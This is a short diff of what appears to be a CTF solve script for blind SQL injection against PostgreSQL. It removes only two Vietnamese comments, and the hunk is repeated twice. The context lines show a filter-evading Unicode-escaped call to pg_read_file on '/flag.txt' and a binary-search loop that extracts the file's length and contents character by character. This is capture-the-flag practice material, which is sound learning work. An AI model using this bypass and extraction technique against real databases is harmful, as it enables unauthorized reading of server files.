@@ -142,7 +142,7 @@ def oracle(cond):
 
 F = 'U&"pg\\005fread\\005ffile"(\'/flag.txt\')'
 
-# 1. Tìm độ dài chuỗi flag
+
 lo, hi = 1, 300
 while lo < hi:
     mid = (lo + hi) // 2
@@ -153,7 +153,7 @@ while lo < hi:
 length = lo
 print(f"[*] Flag Length: {length}")
 
-# 2. Dò từng ký tự ASCII
+
 flag = ""
 for pos in range(1, length + 1):
     lo, hi = 0, 127
@@ -308,7 +308,7 @@ def oracle(cond):
 
 F = 'U&"pg\\005fread\\005ffile"(\'/flag.txt\')'
 
-# 1. Tìm độ dài chuỗi flag
+
 lo, hi = 1, 300
 while lo < hi:
     mid = (lo + hi) // 2
@@ -319,7 +319,7 @@ while lo < hi:
 length = lo
 print(f"[*] Flag Length: {length}")
 
-# 2. Dò từng ký tự ASCII
+
 flag = ""
 for pos in range(1, length + 1):
     lo, hi = 0, 127
